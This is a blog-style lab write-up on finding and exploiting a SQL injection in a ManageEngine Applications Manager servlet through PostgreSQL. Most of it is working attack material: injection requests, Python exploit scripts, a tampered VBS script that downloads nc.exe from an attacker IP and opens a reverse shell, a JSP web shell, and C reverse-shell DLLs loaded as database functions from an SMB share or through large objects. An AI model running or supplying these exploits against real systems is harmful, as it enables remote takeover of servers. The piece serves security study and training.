
This blog analyzes and exploits the SQL injection vulnerability in `ManageEngine_AMUserResourceSyncServlet_servlet`, which can be used to gain access to the underlying operating system. It also covers how to audit compiled Java servlets for similar critical flaws.


This write-up follows a white-box audit workflow: vulnerability discovery, exploitation, and finally Python scripts to obtain a reverse shell.



# Vulnerability Discovery


Use the `JD-GUI` decompiler to recover the original Java source code.
![[Pasted image 20260518003050.png]]

Click Save in the File menu to export a ZIP archive. After extracting it, Notepad++ makes searching much easier.

![[Pasted image 20260518003216.png]]


The first step is to locate every SQL query string, then identify user-controlled input that may lead to SQL injection.

- Use Notepad++ `Find in Files` to search efficiently across the codebase.
![[Pasted image 20260518003829.png]]

- Search the source recovered with `JD-GUI`.  
Search pattern: `^.*?query.*?select.*?`
![[Pasted image 20260518004418.png]]


![[Pasted image 20260518004450.png]]

Too many results create an overly broad attack surface, so start from the front-end UI and review HTTP request handlers first to narrow the scope.
In a typical Java servlet, handler methods can be found by their constant naming pattern: they start with `do` followed by the HTTP verb, such as `doGet` or `doPost`.

![[Pasted image 20260518005108.png]]

This reduces the result set to only 87 hits.
![[Pasted image 20260518005051.png]]

- Review the relevant matches in JD-GUI.
For example, the method below takes an HTTP request as the first argument and an HTTP response as the second, which is exactly what we need.
Focus on the `HTTP Servlet Request object`, because that is what we can control.
![[Pasted image 20260518005440.png]]


A SQL injection point was identified in `AMUserResourcesSyncServlet.class`.
![[Pasted image 20260518010807.png]]

``` java
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
```

- Root cause analysis
The core issue is that `userID` comes directly from an HTTP parameter, 
``` java
String userId = request.getParameter("userId");
```
without type validation, escaping, or `PreparedStatement` usage. The value is concatenated directly into SQL, so we control everything after `USERID=` in the query.

For example, a normal request: `?ForMasRange=1000&userId=5`
Resulting SQL:
``` java
select distinct(RESOURCEID)
from AM_USERRESOURCESTABLE
where USERID=5
and RESOURCEID >1000
and RESOURCEID < 2000
```

If `userID` is supplied as `5 or 1=1`
Resulting SQL:
```java
select distinct(RESOURCEID)
from AM_USERRESOURCESTABLE
where USERID=5 or 1=1
and RESOURCEID >1000
and RESOURCEID < 2000
```


- Enable database logging for analysis
We need visibility into executed queries: which statements succeed and which fail.

The target uses PostgreSQL. Logging must be enabled in the database configuration file.
```
AppManager12\working\pgsql\data\amdb\postgresql.conf
```

Set `log_statement` to `all`
![[Pasted image 20260518022421.png]]

Then restart the ManageEngine Applications Manager service from `services.msc`. 
![[Pasted image 20260518020705.png]]


Open pgAdmin and launch `Query Tool`.
![[Pasted image 20260518021211.png]]

Run a simple query to verify logging.
![[Pasted image 20260518021713.png]]

The query executes successfully. 
![[Pasted image 20260518021839.png]]

Find the newest file in the directory to locate the active PostgreSQL log.
```
dir | sort LastWriteTime | select -last 1
```

![[Pasted image 20260518022812.png]]

This command tails the log and filters for the selected pattern in real time.
```
Get-Content .\postgresql_17.log -wait -tail 1 | Select-String -Pattern "select version"
```

![[Pasted image 20260518023417.png]]

Repeat the earlier test query.
![[Pasted image 20260518021713.png]]

After it succeeds, 
![[Pasted image 20260518021839.png]]

the newest log entry shows the executed statement.
![[Pasted image 20260518023529.png]]


- Validate the vulnerability
Locate the servlet URL mapping in `web.xml`.
![[Pasted image 20260518024500.png]]

In Burp Suite, use `pg_sleep()` for time-based blind injection.
Burp shows an 11-second response delay, confirming successful injection.
![[Pasted image 20260518025215.png]]


You can also monitor database activity from the log in real time.
```
Get-Content postgresql_17.log -tail 100 | Select-String -pattern "(resourceid( >|\)|syntax error)"
```

![[Pasted image 20260518025459.png]]




# Exploitation (Method 1)


- Bypassing HTML encoding restrictions
When SQL injection is sent through the URL, some characters are HTML-encoded before they reach the database.

![[Pasted image 20260518131303.png]]
Quoted string literals may not be usable in queries.
MySQL often allows hex-encoded strings as a workaround; PostgreSQL does not in the same way.

- Bypass with `CHR()` and `||`
When single-quoted strings are unavailable, PostgreSQL can build strings with `CHR(n)` and concatenate them with `||`. URL-encode special characters in requests: `;` as `%3b`, `|` as `%7c`, and spaces as `%20` or `+`.
> Quote filtering alone is insufficient; the real fix is parameterized queries with `PreparedStatement`.

- Bypass with `$...$` dollar-quoted strings
PostgreSQL supports dollar-quoted strings via `$...$` or `$TAG$...$TAG. They are equivalent to single-quoted literals but avoid `'`, which helps bypass weak quote filters. This is useful for function bodies, complex SQL, paths, and payloads, but it does not bypass privilege boundaries or stacked-query restrictions.
``` sql
CREATE TEMP TABLE demo(msg text);

INSERT INTO demo(msg)
VALUES ($TAG$This is a test string$TAG$);

SELECT * FROM demo;

COPY (SELECT msg FROM demo)
TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
```


Blind SQL injection can support querying, enumeration, and data extraction. If the database user is a DBA/superuser, more dangerous primitives become available: server-side file I/O, extensions, C-language functions, and privileged operations. DBA status determines whether the chain can escalate from SQL injection to filesystem interaction or RCE.
The following SQL query verifies whether the current database user is a superuser:
``` sql
SELECT current_setting('is_superuser');
```

PostgreSQL conditional expressions:
```
SELECT case when (...) then pg_sleep(10) end;
```

Example SQL injection request: 
``` 
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(5)+end;--+
```

The delayed response indicates the current user has DBA privileges.
![[Pasted image 20260518124503.png]]


This can be verified with a Python script.
``` python
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://192.168.171.113:8443/servlet/AMUserResourcesSyncServlet"

payload = "1;select case when (select current_setting($$is_superuser$$))=$$on$$ then pg_sleep(5) end;--+"

params = {
    "ForMasRange": "1",
    "userId": payload
}

start = time.time()

r = requests.get(
    url,
    params = params,
    verify = False,
    timeout = 10
)

elapsed = time.time() - start

print("[+] Status Code:", r.status_code)
print("[+] Response Time:", round(elapsed, 2), "seconds")
print("[+] Response Headers:")
print(r.headers)

print("\n[+] Response Body:")
print(r.text)

if elapsed >= 5:
    print("\n[+] Database user is likely SUPERUSER")
else:
    print("\n[-] Database user is likely NOT superuser")
```


- PostgreSQL `COPY ... TO/FROM` can read and write files on the server filesystem. 
``` sql
COPY <table_name> from <file_name>
```

``` sql
COPY <table_name> to <file_name>
```

## Reading Files

Using stacked queries plus `COPY TO`, files can be read from disk.

1. Create a temporary table
```sql
CREATE temp table awae (content text);
```

2. Copy file contents into the table
``` sql
COPY awae from $$c:\test.txt$$;
```
This copies `test.txt` into table `awae`.

3. Under normal conditions, file contents are visible with `SELECT` if you can access the host directly
``` sql
SELECT content from awae;
```

4. Blind SQL injection
Example: 
``` sql
select case when(ascii(substr((select content from awae),1,1))=104) then pg_sleep(5) end;
```

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
Host: manageengine:8443
```


## Writing Files

Place the desired content in a table, then export it with:
``` sql
COPY table TO file
```
to write the data to the target filesystem.

1. Create a temporary table
``` sql
CREATE temp TABLE demo(content text);
```

2. Insert the payload into the table
``` sql
INSERT INTO demo(content) VALUES ($$hello$$);
```

3. Export the table to the filesystem
```sql
COPY demo TO $$c:\test.txt$$;
```


```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;CREATE+temp+TABLE+demo(content+text);INSERT+INTO+demo(content)+VALUES+($$Hello$$);COPY+demo+to+$$c:\\Hello.txt$$;--+ HTTP/1.0
Host: manageengine:8443
```
![[Pasted image 20260518134158.png]]

If the payload is too large for GET, use a POST request instead.
![[Pasted image 20260518134601.png]]

![[Pasted image 20260518134530.png]]


The Python script below sends a stacked SQL injection payload that writes a text file on the target.
``` python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://192.168.171.113:8443/servlet/AMUserResourcesSyncServlet"

payload = "1;create temp table demo(content text);insert into demo(content) values ($$test_python_script$$);copy demo to $$C:\\test_python_script.txt$$;--+"

params = {
    "ForMasRange": "1",
    "userId" : payload
}

# Get request
#r = requests.get(
# url,
# params = params,
# verify = False,
# timeout = 6
#)

# Post request
r = requests.post(
    url,
    data = params,
    verify = False,
    timeout = 6
)

print("[+] Status Code:", r.status_code)
print("[+] Response Headers:")
print(r.headers)

print("\n[+] Response Body:")
print(r.text)
```

> `COPY TO` cannot reliably write binary data.
> Attempting to write binary data with `COPY TO` often fails because:
	1. `COPY TO` is designed for text export and may transform binary bytes, corrupting the output.
	2. Escaping and formatting applied during export are inappropriate for raw binary content.
	3. Filesystem permissions or environment restrictions may block successful writes.



## Reverse Shell via VBS Script Tampering

This method implants malicious code into VBS files executed periodically by ManageEngine Application Manager. When monitoring remote hosts, the product runs scripts from `C:\Program Files (x86)\ManageEngine\AppManager12\working\conf\application\scripts`.


1. Log in and create a monitoring instance targeting the ManageEngine host itself.
![[Pasted image 20260518145144.png]]

![[Pasted image 20260518145240.png]]


![[Pasted image 20260518145857.png]]


![[Pasted image 20260518150155.png]]


On the target host, Process Monitor shows which VBS files run on a schedule.
One recurring script is `wmiget.vbs`. Execution frequency depends on the polling interval configured for the monitored application.

Because the application executes this script, we can append a reverse-shell payload while preserving original functionality for stealth.

Identify the scheduled script file
![[Pasted image 20260518151204.png]]

![[Pasted image 20260518151237.png]]

After clicking `Apply`, the VBS file under the ManageEngine application directory is updated.
![[Pasted image 20260518151411.png]]

Locate the file in that directory
![[Pasted image 20260518151549.png]]

Copy the file contents to your local machine. 
![[Pasted image 20260518152113.png]]


1. Convert the script to a single line so it still executes, then append the payload. `COPY TO` cannot preserve newlines inside one `SELECT` string.
1) Remove comments with regex: `'.*`
![[Pasted image 20260423013351.png]]

2) Collapse continuation lines: `[space]_.*?\n` with `. matches new lines`: ` _.*?\n`

The leading space before `_.*?\n` is easy to miss but required for the regex to work correctly.
![[Pasted image 20260518160018.png]]

3) Replace all tab characters (`\t`)
![[Pasted image 20260518160704.png]]

4) Replace newlines (`\n`) with `:`
![[Pasted image 20260518160902.png]]

At this point, the entire `wmiget.vbs` payload is flattened.
![[Pasted image 20260518160912.png]]

2. For the same reason, the reverse-shell payload must also be one line.
This VBScript payload downloads `nc.exe` and establishes a reverse shell.
Attacker: `192.168.45.234`
```
:Dim objShell:Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run "cmd /K certutil.exe -urlcache -split -f http://192.168.45.234/nc.exe C:\\users\\administrator\\Desktop\\nc.exe & C:\\users\\administrator\\Desktop\\nc.exe -e cmd.exe 192.168.45.234 443":Set objShell = Nothing
```

Insert the payload before `:WScript.Quit(0):` in the script.
![[Pasted image 20260518161252.png]]

![[Pasted image 20260518161336.png]]


Replace `wmiget.vbs` on the target via SQL injection while hosting `nc.exe` on Kali and listening for the callback.
![[Pasted image 20260518162341.png]]


3. Encode the payload twice for GET delivery: Base64 first to avoid `COPY TO` character issues, then URL encoding to survive the web tier. `convert_from(decode(..., 'base64'), 'utf-8')` restores the script text. Generic injection template:
```
ForMasRange=1&userId=1;copy+(select+convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```

Base64-encode the script, URL-encode the result, and replace `ENCODED_PAYLOAD` in the request.
![[Pasted image 20260518162733.png]]



5. Large payloads require POST, which is fine because `doPost` delegates to `doGet` in this servlet.
![[Pasted image 20260518162844.png]]


After the scheduled execution interval, the reverse shell connects back.
![[Pasted image 20260518163830.png]]



Corresponding Python script: 
```python
import requests
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

url = "https://192.168.171.113:8443/servlet/AMUserResourcesSyncServlet"

Payload = """:On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator")::if Err.Number Then:WScript.Echo vbCrLf & "Error # " &             " " & Err.Description:End If:On Error GoTo 0::On Error Resume Next::::Select Case WScript.Arguments.Count:Case 2::strComputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2")::      ::Case 4:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2",strUsername,strPassword)::       case 6:               strComputer = Wscript.Arguments(0):       strUsername = Wscript.Arguments(1):        strPassword = Wscript.Arguments(2):       strQuery = Wscript.Arguments(4):       namespace = Wscript.Arguments(5):       :       Set wbemServices = objWbemLocator.ConnectServer      (strComputer,namespace,strUsername,strPassword):Case Else:strMsg = "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0)::End Select::::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If::On Error GoTo 0::On Error Resume Next::::Set colItems = wbemServices.ExecQuery(strQuery)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If:On Error GoTo 0:::i=0:For Each objItem in colItems:if i=0 then:header = "":For Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.Echo header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceData = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next::Dim objShell:Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run "cmd /K certutil.exe -urlcache -split -f http://192.168.45.234/nc.exe C:\\users\\administrator\\Desktop\\nc.exe & C:\\users\\administrator\\Desktop\\nc.exe -e cmd.exe 192.168.45.234 4444":Set objShell = Nothing:WScript.Quit(0):"""

# 先进行Base64编码
Payload_base64 = base64.b64encode(Payload.encode("utf-8")).decode("ascii")
# 再进行URL编码
Encode_Payload = ''.join(f'%{ord(c):02x}' for c in Payload_base64)

payload_end = f"1;copy+(select+convert_from(decode($${Encode_Payload}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;--+"

body = f"ForMasRange=1&userId={payload_end}"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}


# Post request
r = requests.post(
    url,
    headers=headers,
    proxies = proxies,
    data = body,
    verify = False,
    timeout = 6
)

print("[+] Status Code:", r.status_code)
print("[+] Response Headers:")
print(r.headers)

```


## Reverse Shell via Java Class and JSP Tampering



This vector writes a JSP web shell for remote code execution. Course examples demonstrate command execution through browser access.

1. Prepare a JSP web shell
It executes OS commands from an HTTP `cmd` parameter:
``` jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";

if(cmd != null) {
    String s = null;
    try {
        Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
        BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
        while((s = sI.readLine()) != null) {
            output += s;
        }
    }
    catch(IOException e) {
        e.printStackTrace();
    }
}
%>

<pre>
<%=output %>
</pre>
```

Pass the command below as `cmd` in the HTTP request to download `nc.exe` and connect back.
``` cmd
certutil.exe -urlcache -split -f http://10.0.0.25/nc.exe D:\nc.exe & D:\nc.exe -e cmd.exe 10.0.0.25 4444
```

2. Write the JSP file using Java class manipulation
Reference: 6. openCRX authentication bypass and remote code execution

3. Access the JSP web shell
After a successful write, browse to the JSP with a command parameter, e.g. `http://target.com/shell.jsp?cmd=whoami`.

4. Establish a reverse shell
Use the JSP shell to run a reverse-shell command toward your listener. Common Linux example:
``` bash
/bin/bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
```

The target is Windows, so the command used here is: 
``` powershell
certutil.exe -urlcache -split -f http://10.0.0.25/nc.exe D:\nc.exe & D:\nc.exe -e cmd.exe 10.0.0.25 4444
```






# Exploitation (Method 2)

PostgreSQL can load functions from external DLLs through extensions/user-defined C functions, enabling OS-level execution.

Tampering with application scripts is not always possible, so the PostgreSQL extension mechanism is an alternative when C UDFs can be loaded.

## Theory and Validation

Malicious DLL source (compiled as `awae.dll`):
``` c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);

Datum
awae(PG_FUNCTION_ARGS)
{
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
    int instances = PG_GETARG_INT32(1);
    for (int c = 0; c < instances; c++) {
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
    PG_RETURN_VOID();
}
```


Connect to the database and confirm no existing `test` function is present.

```
psql -h 127.0.0.1 -p 15432 -U postgres -d postgres
appmanager
```


![[Pasted image 20260519173056.png]]

Create function `test` bound to exported symbol `awae` in the custom DLL.

``` sql
create or replace function test(text, integer) returns void as $$c:\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
```

If successful, `SELECT test($calc.exe$, 3)` launches three `calc.exe` processes.

``` sql
SELECT test($$calc.exe$$, 3)
```

![[Pasted image 20260519174050.png]]

![[Pasted image 20260519174042.png]]

If development errors occur, unload the extension and restart cleanly. 
1. Stop the ManageEngine service:
```
c:\> net stop "Applications Manager"
The ManageEngine Applications Manager service was stopped successfully.
```

2. Delete the DLL from disk after the service stops.
```
c:\> del c:\awae.dll
```

3. Start the service again to drop the `test` function.
```
c:\> net start "Applications Manager"
The ManageEngine Applications Manager service is starting.
The ManageEngine Applications Manager service was started successfully.
```

4. Reconnect with `psql` and drop the test function:
```SQL
psql 15432 -U postgres amdb

DROP FUNCTION test(text, integer);
```

You can then edit, recompile, and retest the extension.



## Loading Extensions from a Remote Share

On Kali, host a Samba share using Python impacket tooling.

1. Create an `awae` directory containing `awae.dll` for the share.

![[Pasted image 20260519175459.png]]

2. Verify the target can access the remote share from Kali.
The target can browse the attacker-hosted share successfully.
![[Pasted image 20260519175556.png]]

3. Create `remote_test` bound to `awae.dll` on the attacker share.
``` sql
create or replace function remote_test(text, integer) returns void as $$\\192.168.45.234\awae\awae.dll$$, $$awae$$ language C strict;
```

![[Pasted image 20260519175939.png]]

Terminate the previous `calc.exe` instances:
```
taskkill /f /IM calc.exe
```

![[Pasted image 20260519180059.png]]

Execute in the database:
```sql
select remote_test($$calc.exe$$,  3);
```

The command executes successfully.
![[Pasted image 20260519180219.png]]


## Obtaining a Reverse Shell

Reverse-shell DLL source (`rev_shell.c`):
``` c
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

	/* convert C string to text pointer */
#define GET_TEXT(cstrp) \
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

	/* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	/* FIX THIS */
	hax.sin_port = htons(PG_GETARG_INT32(1));
	/* FIX THIS TOO*/
	hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	PG_RETURN_VOID();
}
```

Prepare the share and payload
![[Pasted image 20260519183149.png]]

Start a local listener
![[Pasted image 20260519181704.png]]


Send the payload with the Python script below:
``` python
import requests
import sys

requests.packages.urllib3.disable_warnings()

def log(msg):
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: %s" % sql[0:80])

    r = requests.get(
        url % sql,
        verify=False
    )

    return r


def create_udf_func(url):
    log("[+] Creating function...")

    sql = r"create or replace function remote_test(text, integer) returns void as $$\\192.168.45.234\\awae\\rev_shell.dll$$, $$connect_back$$ language C strict"
    
    make_request(url, sql)


def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell...")

    sql = "select remote_test($$%s$$, %d)" % (
        ip,
        int(port)
    )

    make_request(url, sql)


if __name__ == '__main__':

    try:
        server = sys.argv[1].strip()
        attacker = sys.argv[2].strip()
        port = sys.argv[3].strip()

    except IndexError:
        print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
        sys.exit()

    sqli_url = (
        "https://"
        + server +
        "/servlet/AMUserResourcesSyncServlet?"
        "ForMasRange=1&userId=1;%s;--"
    )

    create_udf_func(sqli_url)

    trigger_udf(
        sqli_url,
        attacker,
        port
    )
```



``` bash
python manage_engine_sqli_udf.py 192.168.242.113:8443 192.168.45.234 4444
```

![[Pasted image 20260519182921.png]]




# Exploitation (Method 3)

Method 2 relies on a network-hosted DLL. This works well on internal networks, but egress filtering often blocks cross-boundary SMB traffic on public networks.

Instead of remote SMB loading, we need a way to transfer the malicious DLL purely through SQL. `COPY TO` writes arbitrary files but corrupts binary content.
`COPY TO` is text-oriented. DLLs contain non-text bytes (`0x00`, control characters, etc.) that get escaped, truncated, or rewritten, producing a corrupted library that PostgreSQL cannot load.

The goal is to replicate the attack without any network share.



## Overview

Use PostgreSQL large objects to store binary DLL data intact, then export with `lo_export`.
All steps below are driven through the original SQL injection primitive:
1. Create a large object for the DLL payload
2. Export the large object to disk on the target
3. Create a UDF pointing at the exported DLL
4. Trigger the UDF to execute arbitrary code


The first statement creates a random LOID; the second form assigns a fixed LOID.
``` sql
select lo_import($$c:\windows\win.ini$$);

select lo_import($$c:\windows\win.ini$$, 1337);
```

![[Pasted image 20260519185001.png]]

Large objects are stored in `pg_largeobject`.
``` sql
select loid, pageno from pg_largeobject;
```

![[Pasted image 20260519185125.png]]

Inspect imported large-object pages:
``` sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```

![[Pasted image 20260519185157.png]]

Update LOID `1337` page data with hex-encoded content:
Re-query to confirm the page content changed to `woot`.
``` sql
update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;

select loid, pageno, encode(data, 'escape') from pg_largeobject;
```

![[Pasted image 20260519185339.png]]


Export LOID `1337` to `c:\new.win.ini`:
``` sql
select lo_export(1337, 'c:\\new.win.ini');
```

![[Pasted image 20260519185628.png]]

Delete large objects (requires DBA privileges):
```
\lo_list
\lo_unlink 353149
\lo_unlink 1337
```

![[Pasted image 20260519185815.png]]


## Obtaining a Reverse Shell


``` python
import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()

# encoded UDF rev_shell dll
udf ='YOUR DLL GOES HERE'
loid = 1337

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def delete_lo(url, loid):
   log("[+] Deleting existing LO...")
   sql = "SELECT lo_unlink(%d)" % loid
   make_request(url, sql)

def create_lo(url, loid):
   log("[+] Creating LO for UDF injection...")
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid
   make_request(url, sql)
   
def inject_udf(url, loid):
   log("[+] Injecting payload of length %d into LO..." % len(udf))
   for i in range(0,((len(udf)-1)/--------FIX ME--------)+1):
         udf_chunk = udf[i*--------FIX ME--------:(i+1)*--------FIX ME--------]
         if i == 0:
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$--------FIX ME--------$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
         else:
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode($$%s$$, $$--------FIX ME--------$$))" % (loid, i, udf_chunk)
         make_request(url, sql)

def export_udf(url, loid):
   log("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell.dll$$)" % loid
   make_request(url, sql)
   
def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   delete_lo(sqli_url, loid)   
   create_lo(sqli_url, loid)
   inject_udf(sqli_url, loid)
   export_udf(sqli_url, loid)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
```



1. Convert `rev_shell.dll` to hex with `xxd`
``` bash
xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
```

![[Pasted image 20260519190919.png]]

2. Paste the hex blob into the Python script. 
```
cat rev_shell.dll.txt; echo
```


3. Run the script to obtain a reverse shell.
```
python Large_object_rev_shell.py 192.168.242.113:8443 192.168.45.234 4444
```

![[Pasted image 20260519195422.png]]





#### Extra Mile

**Use the SQL injection primitive to create a large object and retrieve the generated `LOID` without blind injection. Update the final PoC to use this technique instead of a hard-coded LOID (1337).**

```
Store the generated LOID in a tracking table and reference it via subqueries in later SQL statements.
```


```  python
import sys
import math
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UDF_HEX_FILE = "rev_shell.dll.txt"
CHUNK_SIZE = 4096  # 2048 bytes = 4096 hex chars


def log(msg):
    print(msg)


def make_request(base_url, sql):
    payload = f"1;{sql};--+"

    params = {
        "ForMasRange": "1",
        "userId": payload
    }

    log("[*] SQL: " + sql[:120])

    r = requests.get(
        base_url,
        params=params,
        verify=False,
        timeout=10
    )

    return r


def init_lo_table(base_url):
    log("[+] Initializing LO tracking table...")

    sql = """
    CREATE TABLE IF NOT EXISTS awae_lo_store (
        id SERIAL PRIMARY KEY,
        loid OID,
        created_at TIMESTAMP DEFAULT now()
    )
    """

    make_request(base_url, sql)


def cleanup_old_lo(base_url):
    log("[+] Cleaning old LO records...")

    sql = """
    SELECT lo_unlink(loid)
    FROM awae_lo_store
    WHERE loid IS NOT NULL
    """

    make_request(base_url, sql)

    sql = "TRUNCATE TABLE awae_lo_store"

    make_request(base_url, sql)


def create_lo(base_url):
    log("[+] Creating Large Object and storing generated LOID...")

    sql = """
    INSERT INTO awae_lo_store(loid)
    SELECT lo_import($$C:\\windows\\win.ini$$)
    """

    make_request(base_url, sql)


def loid_subquery():
    return "(SELECT loid FROM awae_lo_store ORDER BY id DESC LIMIT 1)"


def inject_udf(base_url, udf_hex):
    log(f"[+] Injecting UDF payload, hex length = {len(udf_hex)}")

    total_pages = math.ceil(len(udf_hex) / CHUNK_SIZE)

    for page in range(total_pages):
        chunk = udf_hex[page * CHUNK_SIZE:(page + 1) * CHUNK_SIZE]

        if page == 0:
            sql = f"""
            UPDATE pg_largeobject
            SET data = decode($${chunk}$$, $$hex$$)
            WHERE loid = {loid_subquery()}
            AND pageno = {page}
            """
        else:
            sql = f"""
            INSERT INTO pg_largeobject(loid, pageno, data)
            VALUES (
                {loid_subquery()},
                {page},
                decode($${chunk}$$, $$hex$$)
            )
            """

        make_request(base_url, sql)

    log("[+] UDF payload injected into Large Object")


def export_udf(base_url):
    log("[+] Exporting DLL to target filesystem...")

    sql = f"""
    SELECT lo_export(
        {loid_subquery()},
        $$C:\\Users\\Public\\rev_shell.dll$$
    )
    """

    make_request(base_url, sql)


def create_udf_func(base_url):
    log("[+] Creating PostgreSQL C UDF function...")

    sql = """
    CREATE OR REPLACE FUNCTION rev_shell(text, integer)
    RETURNS void
    AS $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$
    LANGUAGE C STRICT
    """

    make_request(base_url, sql)


def trigger_udf(base_url, attacker_ip, attacker_port):
    log("[+] Triggering reverse shell...")

    sql = f"""
    SELECT rev_shell($${attacker_ip}$$, {int(attacker_port)})
    """

    make_request(base_url, sql)


def read_udf_hex():
    with open(UDF_HEX_FILE, "r", encoding="utf-8") as f:
        return f.read().strip()


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_ip:port> <attacker_ip> <attacker_port>")
        print(f"Example: python3 {sys.argv[0]} 192.168.171.113:8443 192.168.45.234 4444")
        sys.exit(1)

